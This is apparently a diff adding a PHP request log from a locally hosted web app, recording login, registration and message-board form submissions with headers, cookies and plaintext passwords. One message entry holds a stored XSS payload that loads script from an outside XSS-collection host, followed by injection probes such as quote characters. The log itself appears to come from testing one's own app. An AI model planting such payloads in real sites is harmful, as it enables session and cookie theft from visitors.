@@ -1,0 +1,3026 @@
+
+1540519642
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => adminp@ssw0rd
+            [authcode] => zeta
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 5u9ffonvv6p5lg3piaclmadoa4
+            [monitor_count] => 398
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 53
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=5u9ffonvv6p5lg3piaclmadoa4; monitor_count=398
+        )
+
+)
+
+1540519735
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => 123456
+            [password] => 123
+            [repasswd] => 321
+            [authcode] => fkhv
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 5u9ffonvv6p5lg3piaclmadoa4
+            [monitor_count] => 407
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 55
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/zc.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=5u9ffonvv6p5lg3piaclmadoa4; monitor_count=407
+        )
+
+)
+
+1540519913
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => 123456
+            [password] => 233232
+            [repasswd] => 32132321
+            [authcode] => fkhv
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 5u9ffonvv6p5lg3piaclmadoa4
+            [monitor_count] => 410
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 63
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/zc.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=5u9ffonvv6p5lg3piaclmadoa4; monitor_count=410
+        )
+
+)
+
+1540519976
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => adminp@ssw0rd
+            [authcode] => dp9g
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => 5u9ffonvv6p5lg3piaclmadoa4
+            [monitor_count] => 414
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 53
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=5u9ffonvv6p5lg3piaclmadoa4; monitor_count=414
+        )
+
+)
+
+1540728009
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => adminp@ssw0rd
+            [authcode] => y6d3
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [PHPSESSID] => b7tfut5o9pts0pk4g7sollpbd0
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 53
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [Content-Type] => application/x-www-form-urlencoded
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; PHPSESSID=b7tfut5o9pts0pk4g7sollpbd0
+        )
+
+)
+
+1540728010
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => adminp@ssw0rd
+            [authcode] => y6d3
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [PHPSESSID] => b7tfut5o9pts0pk4g7sollpbd0
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 53
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [Content-Type] => application/x-www-form-urlencoded
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; PHPSESSID=b7tfut5o9pts0pk4g7sollpbd0
+        )
+
+)
+
+1540819959
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => adminp@ssw0rd
+            [authcode] => vhc8
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => up5thrgt92he0pcuq858h4mkg3
+            [monitor_count] => 6
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 53
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=up5thrgt92he0pcuq858h4mkg3; monitor_count=6
+        )
+
+)
+
+1540820010
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => haha
+            [password] => haha
+            [repasswd] => haha
+            [authcode] => gddm
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => up5thrgt92he0pcuq858h4mkg3
+            [monitor_count] => 16
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 55
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/zc.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=up5thrgt92he0pcuq858h4mkg3; monitor_count=16
+        )
+
+)
+
+1540820019
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => haha
+            [password] => haha
+            [authcode] => hahx
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => up5thrgt92he0pcuq858h4mkg3
+            [monitor_count] => 18
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 41
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=up5thrgt92he0pcuq858h4mkg3; monitor_count=18
+        )
+
+)
+
+1540820283
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => haha
+            [password] => haha
+            [authcode] => qafc
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => up5thrgt92he0pcuq858h4mkg3
+            [monitor_count] => 32
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 41
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=up5thrgt92he0pcuq858h4mkg3; monitor_count=32
+        )
+
+)
+
+1540821498
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => adminp@ssw0rd
+            [authcode] => b7rw
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => up5thrgt92he0pcuq858h4mkg3
+            [monitor_count] => 80
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 53
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=up5thrgt92he0pcuq858h4mkg3; monitor_count=80
+        )
+
+)
+
+1540821508
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => adminp@ssw0rd
+            [authcode] => qjsu‘’
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => up5thrgt92he0pcuq858h4mkg3
+            [monitor_count] => 82
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 71
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=up5thrgt92he0pcuq858h4mkg3; monitor_count=82
+        )
+
+)
+
+1540821537
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => adminp@ssword
+            [authcode] => 9cvg
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => up5thrgt92he0pcuq858h4mkg3
+            [monitor_count] => 84
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 53
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=up5thrgt92he0pcuq858h4mkg3; monitor_count=84
+        )
+
+)
+
+1540821552
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => admin
+            [password] => adminp@ssw0rd
+            [authcode] => 9tk7
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => up5thrgt92he0pcuq858h4mkg3
+            [monitor_count] => 86
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 53
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=up5thrgt92he0pcuq858h4mkg3; monitor_count=86
+        )
+
+)
+
+1540822005
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [username] => haha
+            [password] => haha
+            [authcode] => jko9
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => up5thrgt92he0pcuq858h4mkg3
+            [monitor_count] => 98
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 41
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/login.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=up5thrgt92he0pcuq858h4mkg3; monitor_count=98
+        )
+
+)
+
+1540822011
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [date] => 2018-10-29
+            [message] => <script src=https://xsspt.com/QIWDcw?1540821956></script>
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => up5thrgt92he0pcuq858h4mkg3
+            [monitor_count] => 100
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 103
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/addMessage.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=up5thrgt92he0pcuq858h4mkg3; monitor_count=100
+        )
+
+)
+
+1540822391
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [date] => 2018-10-29
+            [message] => <>
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => up5thrgt92he0pcuq858h4mkg3
+            [monitor_count] => 105
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 30
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/addMessage.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=up5thrgt92he0pcuq858h4mkg3; monitor_count=105
+        )
+
+)
+
+1540822401
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [date] => 2018-10-29
+            [message] => hahaha
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => up5thrgt92he0pcuq858h4mkg3
+            [monitor_count] => 107
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 30
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/addMessage.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=up5thrgt92he0pcuq858h4mkg3; monitor_count=107
+        )
+
+)
+
+1540822432
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [date] => 2018-10-29
+            [message] => <>
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => up5thrgt92he0pcuq858h4mkg3
+            [monitor_count] => 109
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 30
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/addMessage.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=up5thrgt92he0pcuq858h4mkg3; monitor_count=109
+        )
+
+)
+
+1540822444
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [date] => 
+            [message] => <gsihwid>
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => up5thrgt92he0pcuq858h4mkg3
+            [monitor_count] => 111
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 27
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/addMessage.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=up5thrgt92he0pcuq858h4mkg3; monitor_count=111
+        )
+
+)
+
+1540822871
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [date] => 
+            [message] => '
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => up5thrgt92he0pcuq858h4mkg3
+            [monitor_count] => 113
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 17
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/addMessage.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=up5thrgt92he0pcuq858h4mkg3; monitor_count=113
+        )
+
+)
+
+1540822876
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [date] => 
+            [message] => ''
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => up5thrgt92he0pcuq858h4mkg3
+            [monitor_count] => 115
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 20
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/addMessage.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=up5thrgt92he0pcuq858h4mkg3; monitor_count=115
+        )
+
+)
+
+1540822881
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
+        (
+            [date] => 
+            [message] => "
+        )
+
+    [Cookie] => Array
+        (
+            [Phpstorm-25b2da13] => 0a28dc40-9666-4205-9500-91f1a2ad4698
+            [__guid] => 111872281.2978467721405314600.1530926778746.36
+            [PHPSESSID] => up5thrgt92he0pcuq858h4mkg3
+            [monitor_count] => 117
+        )
+
+    [File] => Array
+        (
+        )
+
+    [Header] => Array
+        (
+            [Host] => localhost:8088
+            [Connection] => keep-alive
+            [Content-Length] => 17
+            [Cache-Control] => max-age=0
+            [Origin] => http://localhost:8088
+            [Upgrade-Insecure-Requests] => 1
+            [User-Agent] => Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+            [Content-Type] => application/x-www-form-urlencoded
+            [Referer] => http://localhost:8088/addMessage.html
+            [Accept-Encoding] => gzip, deflate, br
+            [Accept-Language] => zh-CN,zh;q=0.9
+            [Cookie] => Phpstorm-25b2da13=0a28dc40-9666-4205-9500-91f1a2ad4698; __guid=111872281.2978467721405314600.1530926778746.36; PHPSESSID=up5thrgt92he0pcuq858h4mkg3; monitor_count=117
+        )
+
+)
+
+1540822895
+Array
+(
+    [Get] => Array
+        (
+        )
+
+    [Post] => Array
